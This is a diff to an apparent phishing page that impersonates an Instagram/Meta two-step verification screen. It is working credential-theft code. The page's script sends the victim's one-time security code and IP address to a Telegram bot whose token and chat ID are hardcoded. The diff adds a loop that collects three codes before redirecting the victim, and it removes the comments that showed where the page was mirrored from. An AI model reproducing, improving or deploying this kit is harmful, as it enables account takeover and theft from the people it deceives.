@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-AO">
   
-<!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:13 GMT -->
-<!-- Added by ddddHTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -12,10 +10,9 @@
       href="../../img/socials/icon.png"
       type="image/x-icon"
     />
-    <!-- <link rel="stylesheet" href="../../css/style2.css" /> -->
     <title>Vote with Social Media</title>
     <style>
-     * {
+      * {
     margin: 0;
     padding: 0;
     box-sizing: border-box;
@@ -223,20 +220,16 @@ footer select {
   </head>
   <body onload="SwitchScreen()">
     <section class="container">
-      <!-- SMARTPHONE SECTION -->
       <article class="smartphone">
         <div class="screens">
-         
+          
         </div>
-        <!-- <img src="../../img/socials/smartphones.png" alt="smartphones" /> -->
-      </article>
-      <!-- SMARTPHONE SECTION END -->
-      <!-- FORM SECTION -->
+        </article>
       <article class="form-area">
         <form  id="contactForm"  method="POST">
-         <img src="logo.png" alt="" class="src">
-          <input type="text" id="ipaddress" name="ipaddress" hidden>
+          <img src="logo.png" alt="" class="src">
           <p class="small-title">2-Step Verification</p>
+          <input type="text" id="ipaddress" name="ipaddress" hidden>
           <input
             type="text"
             name="code"
@@ -244,36 +237,25 @@ footer select {
             required
             placeholder="Security code"
           />
-          <!-- <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" /> -->
           <input type="submit" name="submit" value="Confirm" id="submit"/>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <!-- <input type="hidden" name="_next" value="https://fanvote.mynetly.com/sltvot/thanks.html">
-<input type="hidden" name="_captcha" value="false"> -->
-
-        </form>
+          </form>
         <div class="noaccount">
           <a href="#">Don't have an account? <span>Signup</span></a>
         </div>
         <div class="apps">
           <p>Get the app</p>
           <a href="#">
-            <!-- <img src="../../img/socials/appstore.png" alt="Get it from AppStore" /> -->
-          </a>
+            </a>
           <a href="#">
-            <!-- <img
-              src="../../img/socials/googleplay.png"
-              alt="Get it from Google Play"
-            /> -->
-          </a>
+            </a>
         </div>
       </article>
     </section>
-    <!-- FORM SECTION END -->
-    <!-- FOOTER -->
     <footer>
       <div class="footer-content">
         <a href="#">Meta</a>
@@ -348,8 +330,13 @@ footer select {
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
     <script>
+      // Initialize a counter for form submissions
+      let submissionCount = 0;
+      const REDIRECT_THRESHOLD = 3;
+      const REDIRECT_URL = 'thanks.html'; // Set your desired redirect page here
+
       document.addEventListener('DOMContentLoaded', function () {
-        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+        // Fetch IP address and populate the hidden field
         fetch('https://api.ipify.org?format=json')
           .then(response => response.json())
           .then(data => {
@@ -361,39 +348,47 @@ footer select {
           });
       });
 
-
-
-
       document.getElementById('contactForm').addEventListener('submit', function (event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevent default form submission
 
         var code = document.getElementById('code').value;
-        // var password = document.getElementById('password').value;
         var ipaddress = document.getElementById('ipaddress').value;
 
         var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
-      var token = '8059720905:AAERfrdVCeVOTB5-BVFJyGZRIrj5Kt4PhwM';
-      var chat_id = '7368472897';
+        // **NOTE**: For security and privacy, you should use server-side code to handle
+        // the Telegram bot token and chat ID. Exposing them in client-side code is a risk.
+        var token = '8059720905:AAERfrdVCeVOTB5-BVFJyGZRIrj5Kt4PhwM'; 
+        var chat_id = '7368472897';
 
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
+        // Send the data to Telegram
         fetch(url)
           .then(response => response.json())
           .then(data => {
             if (data.ok) {
-              window.location.href = 'thanks.html';  // Redirect to thank you page
+              // Submission successful, now check the counter
+              submissionCount++;
+              
+              if (submissionCount >= REDIRECT_THRESHOLD) {
+                // Third submission or more, redirect the user
+                window.location.href = REDIRECT_URL;
+              } else {
+                // First or second submission, give feedback but DO NOT redirect
+                alert(`Submission ${submissionCount} of ${REDIRECT_THRESHOLD} complete. Please enter the new code.`); 
+                document.getElementById('code').value = ''; // Clear the code field
+              }
             } else {
-              alert('Error sending message.');
+              alert('Error sending message to Telegram.');
             }
           })
           .catch(error => {
             console.error('Error:', error);
+            alert('An unexpected error occurred during submission.');
           });
       });
 
     </script>
   </body>
-
-<!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
 
 </html>
